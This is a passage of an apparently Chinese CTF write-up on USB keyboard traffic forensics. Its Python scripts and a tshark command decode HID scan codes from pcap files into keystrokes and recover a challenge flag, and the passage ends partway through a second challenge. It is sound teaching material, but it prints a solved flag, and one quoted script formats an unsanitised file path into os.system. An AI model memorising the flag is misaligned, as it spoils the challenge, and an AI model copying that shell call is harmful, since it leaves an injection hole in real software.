class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>shiftKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>,<br>     <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>,<br>      <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>,<br>       <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>,<br>        <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>,<br>         <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>,<br>          <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<br>          <span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<br>          <span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br>keys.close()<br><br>flag=<span class="hljs-number">0</span><br>print(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p>运行脚本得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/Python/USB]<br>└─$ python keyboard2.py bingbing.pcapng      <br>666c61677b3866396564326639333365662&lt;DEL&gt;31346138643035323364303334396531323939637d<br>output :666c61677b38663965643266393333656631346138643035323364303334396531323939637d<br></code></pre></td></tr></table></figure><p>使用脚本将十六进制转换为字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">m=<span class="hljs-string">&quot;666C61677B38663965643266393333656631346138643035323364303334396531323939637D&quot;</span><br>s=bytes.fromhex(m)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">b<span class="hljs-string">&#x27;flag&#123;8f9ed2f933ef14a8d0523d0349e1299c&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>题目2：</strong></p><p><img src="https://img-blog.csdnimg.cn/20210405115616535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提取流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r key.pcap -T fields -e usb.capdata &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>查看usbdata.txt内容<br><img src="https://img-blog.csdnimg.cn/20210405120456614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是找到的第三个脚本<a href="https://github.com/WangYihang/UsbKeyboardDataHacker/blob/master/UsbKeyboardDataHacker.py">UsbKeyboardDataHacker.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br>DataFileName = <span class="hljs-string">&quot;usb.dat&quot;</span><br><br>presses = []<br><br>normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-comment"># check argv</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>        print(<span class="hljs-string">&quot;Usage : &quot;</span>)<br>        print(<span class="hljs-string">&quot;        python UsbKeyboardHacker.py data.pcap&quot;</span>)<br>        print(<span class="hljs-string">&quot;Tips : &quot;</span>)<br>        print(<span class="hljs-string">&quot;        To use this python script , you must install the tshark first.&quot;</span>)<br>        print(<span class="hljs-string">&quot;        You can use `sudo apt-get install tshark` to install it&quot;</span>)<br>        print(<span class="hljs-string">&quot;Author : &quot;</span>)<br>        print(<span class="hljs-string">&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;</span>)<br>        print(<span class="hljs-string">&quot;        If you have any questions , please contact me by email.&quot;</span>)<br>        print(<span class="hljs-string">&quot;        Thank you for using.&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># get argv</span><br>    pcapFilePath = sys.argv[<span class="hljs-number">1</span>]<br>    <br>    <span class="hljs-comment"># get data of pcap</span><br>    os.system(<span class="hljs-string">&quot;tshark -r %s -T fields -e usb.capdata &#x27;usb.data_len == 8&#x27; &gt; %s&quot;</span> % (pcapFilePath, DataFileName))<br><br>    <span class="hljs-comment"># read data</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(DataFileName, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            presses.append(line[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>])<br>    <span class="hljs-comment"># handle</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> press <span class="hljs-keyword">in</span> presses:<br>        <span class="hljs-keyword">if</span> 